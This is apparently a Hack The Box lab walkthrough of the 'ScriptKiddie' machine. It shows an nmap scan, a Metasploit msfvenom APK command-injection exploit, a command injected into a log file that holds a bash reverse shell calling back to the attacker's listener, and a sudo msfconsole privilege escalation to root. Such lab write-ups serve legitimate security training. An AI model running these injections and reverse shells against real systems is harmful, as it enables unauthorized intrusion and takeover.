
![Image ScriptKiddie](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/ScriptKiddie/ScriptKiddie1.png)


## --------------->> ScriptKiddie <<----------------


// We start with nmap scan 

    $nmap -sV -A -Pn -T4 10.10.10.226 -p-
------

    Nmap scan report for 10.10.10.226
    Host is up (0.62s latency).
    Not shown: 65483 closed tcp ports (conn-refused), 50 filtered tcp ports (no-response)
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
    |   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
    |_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
    5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
    |_http-title: k1d'5 h4ck3r t00l5

// Navigating to http://10.10.10.226:5000/ shows us a webpage that connects with linux machine tools

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/ScriptKiddie/1.png)

- nmap scan - port scanner

- msfvenow payload generator to: Windows, Linux, Android

- searchsplois - exploitDB vulnerability library

// Searching for vulnerabillities on Werkzeug didnt end with success

// So i tried to search vulnerabilities on msfvenom and Indeed find one

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/ScriptKiddie/2.png)

    msf6 > search msfvenom
    msf6 > use 0
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > set lhost 10.10.16.2
    lhost => 10.10.16.2
    msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > run

    [+] msf.apk stored at /home/user/.msf4/local/msf.apk

// First open a listiner with nc

    $ nc -lvnp 4444
    listening on [any] 4444 ...

// And lets upload it

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/ScriptKiddie/3.png)

// We got a shell as 'kid'!

    $ nc -lvnp 4444
    listening on [any] 4444 ...
    connect to [10.10.16.2] from (UNKNOWN) [10.10.10.226] 33644

    id
    uid=1000(kid) gid=1000(kid) groups=1000(kid)

// Lets upgrade shell with python tty

    python3 -c 'import pty; pty.spawn("/bin/bash");'
    kid@scriptkiddie:~/html$ ls

// And we got user flag !

    kid@scriptkiddie:~$ cat user.txt	
    cat user.txt
    ab89861.....................



### -----Privilleges Escalation------


// When searching the machine i have found another user called 'pwn' 

    kid@scriptkiddie:~/home$ ls
    ls
    kid  pwn

// Searching in his directory i have found bash script called 'scanlosers.sh'


    kid@scriptkiddie:~/home$ cd pwn
    cd pwn
    kid@scriptkiddie:~/home/pwn$ ls
    ls
    recon  scanlosers.sh

// Lets see the script

    kid@scriptkiddie:~/home/pwn$$ cat scanlosers.sh
    cat scanlosers.sh
    #!/bin/bash

    log=/home/kid/logs/hackers

    cd /home/pwn/
    cat $log | cut -d' ' -f3- | sort -u | while read ip; do
        sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
    done

    if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi

// It seems that this file take output from /home/kid/logs/hackers

// Navigating to there i could see that we have write permissions on 'hackers' file

    kid@scriptkiddie:~/logs/$ ls -l
    -rw-rw-r-- 1 kid  pwn  0 Feb 3  2020 hackers

// So, it seems we can inject our script to there, first we open a listiner

    $ nc -lvnp 1445
    listening on [any] 1445 ...

// some searchs and tried lead me to this query

    kid@scriptkiddie:~/logs$ echo "  ;/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.2/1445 0>&1' # " >> hackers 

// And we got a shell as 'pwn'!

    $nc -lvnp 1445
    listening on [any] 1445 ...
    connect to [10.10.16.2] from (UNKNOWN) [10.10.10.226] 52734
    bash: cannot set terminal process group (879): Inappropriate ioctl for device
    bash: no job control in this shell
    pwn@scriptkiddie:~$ id
    id
    uid=1001(pwn) gid=1001(pwn) groups=1001(pwn)
    pwn@scriptkiddie:~$ 

// Running sudo -l to see what sudo permissions we have

    pwn@scriptkiddie:~$ sudo -l
    sudo -l
    Matching Defaults entries for pwn on scriptkiddie:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User pwn may run the following commands on scriptkiddie:
        (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole

// We can run msfconsole with sudo !

// Since msfconsole have it a framework and also have shell then we can run shell from msfconsole as root

// And get the root flag !

    pwn@scriptkiddie:~$ sudo msfconsole
    sudo msfconsole


     ______________________________________________________________________________
    |                                                                              |
    |                          3Kom SuperHack II Logon                             |
    |______________________________________________________________________________|
    |                                                                              |
    |                                                                              |
    |                                                                              |
    |                 User Name:          [   security    ]                        |
    |                                                                              |
    |                 Password:           [               ]                        |
    |                                                                              |
    |                                                                              |
    |                                                                              |
    |                                   [ OK ]                                     |
    |______________________________________________________________________________|
    |                                                                              |
    |                                                       https://metasploit.com |
    |______________________________________________________________________________|


           =[ metasploit v6.0.9-dev                           ]
    + -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
    + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
    + -- --=[ 7 evasion                                       ]

    Metasploit tip: Adapter names can be used for IP params set LHOST eth0

    msf6 > cd ..
    msf6 > cd ..
    msf6 > cd root
    msf6 > cat root.txt
    [*] exec: cat root.txt

    b2b0ab46..................
